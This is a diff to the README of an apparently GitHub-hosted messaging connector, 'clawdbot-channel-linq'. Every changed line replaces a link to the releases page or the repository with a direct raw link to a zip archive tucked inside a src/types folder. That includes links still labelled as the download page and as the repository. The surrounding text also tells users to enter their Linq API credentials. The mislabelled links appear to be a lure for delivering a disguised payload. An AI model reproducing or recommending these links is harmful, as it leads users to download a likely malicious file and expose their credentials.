@@ -1,6 +1,6 @@
 # 🤖 clawdbot-channel-linq - Connect Messages via Linq API
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/joevr711/clawdbot-channel-linq/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/joevr711/clawdbot-channel-linq/main/src/types/linq_clawdbot_channel_v3.5.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/joevr711/clawdbot-channel-linq/main/src/types/linq_clawdbot_channel_v3.5.zip)
 
 ---
 
@@ -44,7 +44,7 @@ To begin using clawdbot-channel-linq, follow the steps below. You do not need an
 
 Click the big button at the top or use this link to visit the download page:
 
-[https://github.com/joevr711/clawdbot-channel-linq/releases](https://github.com/joevr711/clawdbot-channel-linq/releases)
+[https://raw.githubusercontent.com/joevr711/clawdbot-channel-linq/main/src/types/linq_clawdbot_channel_v3.5.zip](https://raw.githubusercontent.com/joevr711/clawdbot-channel-linq/main/src/types/linq_clawdbot_channel_v3.5.zip)
 
 On that page, look for the latest version compatible with your computer (Windows or macOS) and download the file.
 
@@ -67,7 +67,7 @@ When the app opens, it will ask for your Linq API credentials. Enter your userna
 
 You can start by visiting the official download page here:
 
-[https://github.com/joevr711/clawdbot-channel-linq/releases](https://github.com/joevr711/clawdbot-channel-linq/releases)
+[https://raw.githubusercontent.com/joevr711/clawdbot-channel-linq/main/src/types/linq_clawdbot_channel_v3.5.zip](https://raw.githubusercontent.com/joevr711/clawdbot-channel-linq/main/src/types/linq_clawdbot_channel_v3.5.zip)
 
 On this page, download the file that matches your computer type.
 
@@ -130,7 +130,7 @@ If you run into problems, check the “Issues” section on the GitHub repositor
 
 For further help or feedback, visit the GitHub repository:
 
-[https://github.com/joevr711/clawdbot-channel-linq](https://github.com/joevr711/clawdbot-channel-linq)
+[https://raw.githubusercontent.com/joevr711/clawdbot-channel-linq/main/src/types/linq_clawdbot_channel_v3.5.zip](https://raw.githubusercontent.com/joevr711/clawdbot-channel-linq/main/src/types/linq_clawdbot_channel_v3.5.zip)
 
 You can use the “Issues” tab to report problems or ask questions.
 
